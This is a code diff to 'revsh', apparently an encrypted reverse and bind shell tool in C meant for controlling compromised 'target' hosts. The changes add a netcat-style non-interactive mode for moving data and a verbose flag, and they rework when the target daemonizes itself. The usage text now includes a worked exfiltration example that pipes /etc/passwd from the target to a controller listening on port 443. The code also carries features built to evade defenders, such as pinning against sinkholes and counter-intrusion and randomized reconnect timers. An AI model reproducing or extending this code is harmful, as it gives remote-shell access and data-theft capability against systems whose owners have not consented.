@@ -30,13 +30,14 @@
  *		* Cert pinning for protection against sinkholes and mitm counter-intrusion.
  *		* Connection timeout for remote process self-termination.
  *		* Randomized retry timers for non-predictable auto-reconnection.
+ *		* Non-interactive mode for transfering files.
  *
  **********************************************************************************************************************/
 
 
+
 #include "common.h"
 #include "keys/dh_params.c"
-
 
 
 
@@ -67,7 +68,7 @@ int posix_openpt(int flags){
  *
  **********************************************************************************************************************/
 void usage(){
-	fprintf(stderr, "\nusage: %s [-c [-a] [-s SHELL] [-d KEYS_DIR] [-f RC_FILE]] [-b [-k]] [-t SEC] [-r SEC1[,SEC2]] [ADDRESS:PORT]\n", \
+	fprintf(stderr, "\nusage:\t%s [-c [-a] [-s SHELL] [-d KEYS_DIR] [-f RC_FILE]] [-t SEC] [-r SEC1[,SEC2]] [-b [-k]] [-n] [-v] [ADDRESS:PORT]\n", \
 			program_invocation_short_name);
 	fprintf(stderr, "\n\t-c\t\tRun in controller mode.\t\t\t\t(Default is target mode.)\n");
 	fprintf(stderr, "\t-a\t\tEnable Anonymous Diffie-Hellman mode.\t\t(Default is \"%s\".)\n", CONTROLLER_CIPHER);
@@ -78,14 +79,19 @@ void usage(){
 	fprintf(stderr, "\t-r SEC1,SEC2\tSet the retry time to be SEC1 seconds, or\t(Default is \"%s\".)\n\t\t\tto be random in the range from SEC1 to SEC2.\n", RETRY);
 	fprintf(stderr, "\t-b\t\tStart in bind shell mode.\t\t\t(Default is reverse shell mode.)\n");
 	fprintf(stderr, "\t-k\t\tStart the bind shell in keep-alive mode.\t(Ignored in reverse shell mode.)\n");
+	fprintf(stderr, "\t-n\t\tNetcat style data broker. No tty.\t\t(Default is interactive w/remote tty.)\n\t\t\tNon-interactive. Useful for copying files.\n");
+	fprintf(stderr, "\t-h\t\tVerbose output. (Output may mix with data if used with '-n'.)\n");
 	fprintf(stderr, "\t-h\t\tPrint this help.\n");
 	fprintf(stderr, "\tADDRESS:PORT\tThe address and port of the listening socket.\t(Default is \"%s\".)\n", ADDRESS);
 	fprintf(stderr, "\n\tNotes:\n");
 	fprintf(stderr, "\t\t* The -b flag must be invoked on both the control and target hosts to enable bind shell mode.\n");
 	fprintf(stderr, "\t\t* Bind shell mode can also be enabled by invoking the binary as 'bindsh' instead of 'revsh'.\n");
-	fprintf(stderr, "\n\tExample:\n");
+	fprintf(stderr, "\n\tInteractive example:\n");
 	fprintf(stderr, "\t\tlocal controller host:\trevsh -c 192.168.0.42:443\n");
 	fprintf(stderr, "\t\tremote target host:\trevsh 192.168.0.42:443\n");
+	fprintf(stderr, "\n\tNon-interactive example:\n");
+	fprintf(stderr, "\t\tlocal controller host:\trevsh -n -c 192.168.0.42:443 >data_exfil/passwd\n");
+	fprintf(stderr, "\t\tremote target host:\tcat /etc/passwd | revsh 192.168.0.42:443\n");
 	fprintf(stderr, "\n\n");
 
 	exit(-1);
@@ -143,8 +149,8 @@ void catch_alarm(int signal){
  * Notes:
  *	main() can be broken into three sections:
  *		1) Basic initialization.
- *		2) Setup the controller and call the broker().
- *		3) Setup the target and call the broker().
+ *		2) Setup the controller and call broker().
+ *		3) Setup the target and call broker().
  *
  **********************************************************************************************************************/
 int main(int argc, char **argv){
@@ -229,10 +235,17 @@ int main(int argc, char **argv){
 	struct sockaddr addr;
 	socklen_t addrlen = (socklen_t) sizeof(addr);
 
+	int verbose = 0;
+
 
 	/*
 	 * Basic initialization.
 	 */
+
+	io.interactive = 1;
+	io.local_in_fd = fileno(stdin);
+	io.local_out_fd = fileno(stdout);
+
 
 	/*  Normally I would use the Gnu version. However, this tool needs to be more portable. */
 	/*  Keeping the naming scheme, but setting it up myself. */
@@ -243,7 +256,7 @@ int main(int argc, char **argv){
 	io.encryption = EDH;
 
 
-	while((opt = getopt(argc, argv, "pbkacs:d:f:r:ht:")) != -1){
+	while((opt = getopt(argc, argv, "pbkacs:d:f:r:ht:nv")) != -1){
 		switch(opt){
 
 			/*  plaintext */
@@ -297,6 +310,14 @@ int main(int argc, char **argv){
 							strerror(errno));
 					usage();
 				}
+				break;
+
+			case 'n':
+				io.interactive = 0;
+				break;
+
+			case 'v':
+				verbose = 1;
 				break;
 
 			case 'h':
@@ -429,7 +450,7 @@ int main(int argc, char **argv){
 	 * - Send initial termios data.
 	 * - Set local terminal to raw. 
 	 * - Send the commands in the rc file.
-	 * - Enter broker() for data brokering.
+	 * - Enter broker() for tty brokering.
 	 * - Reset local term.
 	 * - Exit.
 	 */
@@ -558,8 +579,10 @@ int main(int argc, char **argv){
 				exit(-1);
 			}
 
-			printf("Connecting to %s...", buff_head);
-			fflush(stdout);
+			if(verbose){
+				printf("Connecting to %s...", buff_head);
+				fflush(stdout);
+			}
 
 			while(((retval = BIO_do_connect(io.connect)) != 1) && retry_start){
 
@@ -572,12 +595,18 @@ int main(int argc, char **argv){
 					retry = retry_start;
 				}
 
-				printf("No connection.\nRetrying in %d seconds...\n", retry);
+				if(verbose){
+					printf("No connection.\nRetrying in %d seconds...\n", retry);
+				}
+
 				req.tv_sec = retry;
 				req.tv_nsec = 0;
 				nanosleep(&req, NULL);
-				printf("Connecting to %s...", buff_head);
-				fflush(stdout);
+
+				if(verbose){
+					printf("Connecting to %s...", buff_head);
+					fflush(stdout);
+				}
 			}
 
 			if(retval != 1){
@@ -589,8 +618,11 @@ int main(int argc, char **argv){
 
 		}else{
 			/*  - Listen for a connection. */
-			printf("Listening on %s...", buff_head);
-			fflush(stdout);
+
+			if(verbose){
+				printf("Listening on %s...", buff_head);
+				fflush(stdout);
+			}
 
 			if((accept = BIO_new_accept(buff_head)) == NULL){
 				fprintf(stderr, "%s: %d: BIO_new_accept(%s): %s\n", \
@@ -641,7 +673,9 @@ int main(int argc, char **argv){
 
 		alarm(0);
 
-		printf("\tConnected!\n");
+		if(verbose){
+			printf("\tConnected!\n");
+		}
 
 		if(BIO_get_fd(io.connect, &(io.remote_fd)) < 0){
 			fprintf(stderr, "%s: %d: BIO_get_fd(%lx, %lx): %s\n", \
@@ -720,18 +754,20 @@ int main(int argc, char **argv){
 					exit(-1);
 				}
 
+				if(verbose){
+					printf(" Remote fingerprint expected: ");
+					for(i = 0; i < (int) allowed_fingerprint_len; i++){
+						printf("%02x", allowed_fingerprint[i]);
+					}
+					printf("\n");
+				}
+
 				if((remote_cert = SSL_get_peer_certificate(io.ssl)) == NULL){
 					fprintf(stderr, "%s: %d: SSL_get_peer_certificate(%lx): %s\n", \
 							program_invocation_short_name, io.controller, (unsigned long) io.ssl, strerror(errno));
 					ERR_print_errors_fp(stderr);
 					exit(-1);
 				}
-
-				printf(" Remote fingerprint expected: ");
-				for(i = 0; i < (int) allowed_fingerprint_len; i++){
-					printf("%02x", allowed_fingerprint[i]);
-				}
-				printf("\n");
 
 				if(!X509_digest(remote_cert, fingerprint_type, remote_fingerprint, &remote_fingerprint_len)){
 					fprintf(stderr, "%s: %d: X509_digest(%lx, %lx, %lx, %lx): %s\n", \
@@ -745,11 +781,13 @@ int main(int argc, char **argv){
 					exit(-1);
 				}
 
-				printf(" Remote fingerprint received: ");
-				for(i = 0; i < (int) remote_fingerprint_len; i++){
-					printf("%02x", remote_fingerprint[i]);
+				if(verbose){
+					printf(" Remote fingerprint received: ");
+					for(i = 0; i < (int) remote_fingerprint_len; i++){
+						printf("%02x", remote_fingerprint[i]);
+					}
+					printf("\n");
 				}
-				printf("\n");
 
 				if(allowed_fingerprint_len != remote_fingerprint_len){
 					fprintf(stderr, "%s: %d: Fingerprint mistmatch. Possible mitm. Aborting!\n", \
@@ -767,8 +805,65 @@ int main(int argc, char **argv){
 			}
 		}
 
+		if(verbose){
+			printf("Initializing...");
+		}
 
-		printf("Initializing...");
+
+		/*  - Agree on interactive / non-interactive mode. */
+		memset(buff_head, 0, buff_len);
+		buff_tail = buff_head;
+		*(buff_tail++) = (char) APC;
+		*(buff_tail++) = (char) io.interactive;
+		*(buff_tail++) = (char) ST;
+
+		if((io_bytes = io.remote_write(&io, buff_head, HANDSHAKE_LEN)) == -1){
+			fprintf(stderr, "%s: %d: io.remote_write(%lx, %lx, %d): %s\n", \
+					program_invocation_short_name, io.controller, \
+					(unsigned long) &io, (unsigned long) buff_head, HANDSHAKE_LEN, strerror(errno));
+			exit(-1);
+		}
+
+		if(io_bytes != HANDSHAKE_LEN){
+			fprintf(stderr, "%s: %d: io.remote_write(%lx, %lx, %d): Unable to write entire string.\n", \
+					program_invocation_short_name, io.controller, \
+					(unsigned long) &io, (unsigned long) buff_head, HANDSHAKE_LEN);
+			exit(-1);
+		}
+
+		memset(buff_head, 0, buff_len);
+		buff_tail = buff_head;
+		if((io_bytes = io.remote_read(&io, buff_tail, HANDSHAKE_LEN)) == -1){
+			fprintf(stderr, "%s: %d: io.remote_read(%lx, %lx, %d): %s\r\n", \
+					program_invocation_short_name, io.controller, \
+					(unsigned long) &io, (unsigned long) buff_tail, HANDSHAKE_LEN, strerror(errno));
+			exit(-1);
+		}
+
+		if(io_bytes != HANDSHAKE_LEN){
+			fprintf(stderr, "%s: %d: io.remote_read(%lx, %lx, %d): Unable to write entire string.\n", \
+					program_invocation_short_name, io.controller, \
+					(unsigned long) &io, (unsigned long) buff_tail, HANDSHAKE_LEN);
+			exit(-1);
+		}
+
+		/* Both sides must agree on interaction. If either one opts out, fall back to non-interactive data transfer. */	
+		if(!buff_head[1]){
+			io.interactive = 0;
+		}
+
+		if(!io.interactive){
+			retval = broker(&io);
+
+			if(io.encryption){
+				SSL_shutdown(io.ssl);
+				SSL_free(io.ssl);
+				SSL_CTX_free(io.ctx);
+			}
+
+			return(retval);
+		}
+
 
 		/*  - Send initial shell data. */
 		memset(buff_head, 0, buff_len);
@@ -944,9 +1039,10 @@ int main(int argc, char **argv){
 			exit(-1);
 		}	
 
-		printf("\tDone!\r\n\n");
+		if(verbose){
+			printf("\tDone!\r\n\n");
+		}
 
-		io.local_fd = STDIN_FILENO;
 
 		/*  - Send the commands in the rc file. */
 
@@ -957,7 +1053,7 @@ int main(int argc, char **argv){
 
 			while((io_bytes = read(rc_fd, buff_head, buff_len))){
 				if(io_bytes == -1){
-					print_error(&io, "%s: %d: broker(): read(%d, %lx, %d): %s\r\n", \
+					print_error(&io, "%s: %d: read(%d, %lx, %d): %s\r\n", \
 							program_invocation_short_name, io.controller, \
 							rc_fd, (unsigned long) buff_head, buff_len, strerror(errno));
 					exit(-1);
@@ -966,7 +1062,7 @@ int main(int argc, char **argv){
 
 				while(buff_ptr != buff_tail){
 					if((retval = io.remote_write(&io, buff_ptr, (buff_tail - buff_ptr))) == -1){
-						print_error(&io, "%s: %d: broker(): io.remote_write(%lx, %lx, %d): %s\r\n", \
+						print_error(&io, "%s: %d: io.remote_write(%lx, %lx, %d): %s\r\n", \
 								program_invocation_short_name, io.controller, \
 								(unsigned long) &io, (unsigned long) buff_ptr, (buff_tail - buff_ptr), strerror(errno));
 						exit(-1);
@@ -981,7 +1077,7 @@ int main(int argc, char **argv){
 
 		errno = 0;
 
-		/*  - Enter broker() for data brokering. */
+		/*  - Enter broker() for tty brokering. */
 		if((retval = broker(&io) == -1)){
 			print_error(&io, "%s: %d: broker(%lx): %s\r\n", \
 					program_invocation_short_name, io.controller, (unsigned long) &io,
@@ -1029,41 +1125,18 @@ int main(int argc, char **argv){
 		 * - Create a pseudo-terminal (pty).
 		 * - Send basic information back to the controller about the connecting host.
 		 * - Fork a child to run the shell.
-		 * - Parent: Enter the broker() and broker data.
+		 * - Parent: Enter broker() and broker tty.
 		 * - Child: Initialize file descriptors.
 		 * - Child: Set the pty as controlling.
 		 * - Child: Call execve() to invoke a shell.
 		 */
 	}else{
 
-		/*  Note: We will make heavy use of #ifdef DEBUG here. I don't want to *ever* print to the */
-		/*  remote host. We can do so if debugging, but otherwise just fail silently. Once the  */
-		/*  connection is open, we will try to shove errors down the socket, but otherwise fail */
-		/*  silently. */
+		/*  Note: We will make heavy use of #ifdef DEBUG here. I don't want to *ever* accidentally */
+		/*	print to the remote host. We can do so if debugging, but otherwise just fail silently. */
+		/*	Once the connection is open, we will try to shove errors down the socket, but otherwise */
+		/*	fail silently. */
 
-#ifndef DEBUG
-
-		/*  - Become a daemon. */
-		umask(0);
-
-		retval = fork();
-
-
-		if(retval == -1){
-			exit(-1);
-		}else if(retval){
-			exit(0);
-		}
-
-		if((retval = setsid()) == -1){
-			exit(-1);
-		}
-
-		if((retval = chdir("/")) == -1){
-			exit(-1);
-		}
-
-#endif
 
 		/*  - Setup SSL. */
 		if(io.encryption){
@@ -1246,11 +1319,11 @@ int main(int argc, char **argv){
 				exit(-1);
 			}
 
+			if(verbose){
+				printf("Connecting to %s...", buff_head);
+				fflush(stdout);
+			}
 
-#ifdef DEBUG
-			printf("Connecting to %s...", buff_head);
-			fflush(stdout);
-#endif
 			while(((retval = BIO_do_connect(io.connect)) != 1) && retry_start){
 
 				/*  Using RAND_pseudo_bytes() instead of RAND_bytes() because this is a best effort. We don't */
@@ -1262,16 +1335,18 @@ int main(int argc, char **argv){
 					retry = retry_start;
 				}
 
-#ifdef DEBUG
-				printf("No connection.\r\nRetrying in %d seconds...\r\n", retry);
-#endif
+				if(verbose){
+					printf("No connection.\r\nRetrying in %d seconds...\r\n", retry);
+				}
+
 				req.tv_sec = retry;
 				req.tv_nsec = 0;
 				nanosleep(&req, NULL);
-#ifdef DEBUG
-				printf("Connecting to %s...", buff_head);
-				fflush(stdout);
-#endif
+
+				if(verbose){
+					printf("Connecting to %s...", buff_head);
+					fflush(stdout);
+				}
 			}
 
 			if(retval != 1){
@@ -1297,9 +1372,9 @@ int main(int argc, char **argv){
 
 		alarm(0);
 
-#ifdef DEBUG
-		printf("\tConnected!\r\n");
-#endif
+		if(verbose){
+			printf("\tConnected!\r\n");
+		}
 
 		if(BIO_get_fd(io.connect, &(io.remote_fd)) < 0){
 #ifdef DEBUG
@@ -1393,6 +1468,86 @@ int main(int argc, char **argv){
 				free(remote_fingerprint_str);
 			}
 		}
+
+
+		/*  - Agree on interactive / non-interactive mode. */
+		memset(buff_head, 0, buff_len);
+		buff_tail = buff_head;
+		*(buff_tail++) = (char) APC;
+		*(buff_tail++) = (char) io.interactive;
+		*(buff_tail++) = (char) ST;
+
+		if((io_bytes = io.remote_write(&io, buff_head, HANDSHAKE_LEN)) == -1){
+			fprintf(stderr, "%s: %d: io.remote_write(%lx, %lx, %d): %s\n", \
+					program_invocation_short_name, io.controller, \
+					(unsigned long) &io, (unsigned long) buff_head, HANDSHAKE_LEN, strerror(errno));
+			exit(-1);
+		}
+
+		if(io_bytes != HANDSHAKE_LEN){
+			fprintf(stderr, "%s: %d: io.remote_write(%lx, %lx, %d): Unable to write entire string.\n", \
+					program_invocation_short_name, io.controller, \
+					(unsigned long) &io, (unsigned long) buff_head, HANDSHAKE_LEN);
+			exit(-1);
+		}
+
+		memset(buff_head, 0, buff_len);
+		buff_tail = buff_head;
+		if((io_bytes = io.remote_read(&io, buff_tail, HANDSHAKE_LEN)) == -1){
+			fprintf(stderr, "%s: %d: io.remote_read(%lx, %lx, %d): %s\r\n", \
+					program_invocation_short_name, io.controller, \
+					(unsigned long) &io, (unsigned long) buff_tail, HANDSHAKE_LEN, strerror(errno));
+			exit(-1);
+		}
+
+		if(io_bytes != HANDSHAKE_LEN){
+			fprintf(stderr, "%s: %d: io.remote_read(%lx, %lx, %d): Unable to write entire string.\n", \
+					program_invocation_short_name, io.controller, \
+					(unsigned long) &io, (unsigned long) buff_tail, HANDSHAKE_LEN);
+			exit(-1);
+		}
+
+		if(!buff_head[1]){
+			io.interactive = 0;
+		}
+
+		if(!io.interactive){
+			retval = broker(&io);
+
+			if(io.encryption){
+				SSL_shutdown(io.ssl);
+				SSL_free(io.ssl);
+				SSL_CTX_free(io.ctx);
+			}
+
+			return(retval);
+		}
+
+
+#ifndef DEBUG
+
+		/*  - Become a daemon. */
+		umask(0);
+
+		retval = fork();
+
+
+		if(retval == -1){
+			exit(-1);
+		}else if(retval){
+			exit(0);
+		}
+
+		if((retval = setsid()) == -1){
+			exit(-1);
+		}
+
+		if((retval = chdir("/")) == -1){
+			exit(-1);
+		}
+
+#endif
+
 
 		/*  - Receive and set the shell. */
 		if((io_bytes = io.remote_read(&io, &tmp_char, 1)) == -1){
@@ -1698,7 +1853,7 @@ int main(int argc, char **argv){
 
 		if(retval){
 
-			/*  - Parent: Enter the broker() and broker data. */
+			/*  - Parent: Enter broker() and broker tty. */
 			if((retval = close(pty_slave)) == -1){
 				print_error(&io, "%s: %d: close(%d): %s\r\n", \
 						program_invocation_short_name, io.controller, \
@@ -1706,7 +1861,8 @@ int main(int argc, char **argv){
 				exit(-1);
 			}
 
-			io.local_fd = pty_master;
+			io.local_in_fd = pty_master;
+			io.local_out_fd = pty_master;
 
 			retval = broker(&io);
 
